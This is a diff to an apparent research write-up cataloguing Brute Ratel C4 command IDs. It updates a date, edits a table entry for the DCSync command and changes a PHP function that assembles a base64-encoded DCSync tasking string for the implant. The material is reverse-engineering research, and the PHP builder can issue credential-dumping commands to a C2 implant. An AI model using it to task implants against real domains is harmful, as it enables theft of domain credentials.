@@ -7,7 +7,7 @@ date: 2025-03-28
 
 ## BRUTERATEL COMMAND LIST PART 4 
 
-updated : 11/04/2025  
+updated : 02/05/2025  
 
 ## Context  
 
@@ -42,7 +42,7 @@ Here is a short description of the next 20 command codes and purpose :
 
 | Command ID   | Description             | Parameter         |
 | :----------- | :---------------------- | :----------------:|
-| "\x81\x98"  | [DCSync](#DCSync) | $TypeFormatString, $ProcFormatString |
+| "\x81\x98"  | [DCSync](#DCSync) | $Admin, $DomainName |
 | "\x53\x49"   | [netshareenum](#netshareenum) | $servername, $level |
 | "\x13\x52"  | [ExecWQLQuery](#ExecWQLQuery) | $query |
 | "\xe7\x81"   | [GetAccountSidFromPid](#GetAccountSidFromPid) | $pid |
@@ -75,12 +75,12 @@ Vicent Le Toux [MakeMeEntrepriseAdmin](https://github.com/vletoux/MakeMeEnterpri
 and Benjamin Delpy [MimiKatz](https://github.com/gentilkiwi/mimikatz/)  
 
 ```php
-function DCSync($TypeFormatString, $ProcFormatString)
+function DCSync($TypeFormatString, $ProcFormatString, $Admin, $DomainName)
 {
 	$TypeFormatString_b64 = base64_encode($TypeFormatString);
 	$ProcFormatString_b64 = base64_encode($ProcFormatString);
 	
-	$cmd_id = "\x81\x98 $TypeFormatString_b64 $ProcFormatString_b64 AA BB CC DD EE FF GG HH II JJ KK LL MM NN";
+	$cmd_id = "\x81\x98 $TypeFormatString_b64 $ProcFormatString_b64 AA BB CC DD EE FF GG HH II JJ KK LL MM NN $Admin $DomainName";
 	$cmd_id_b64 = base64_encode($cmd_id);
 	
 	return $cmd_id_b64;
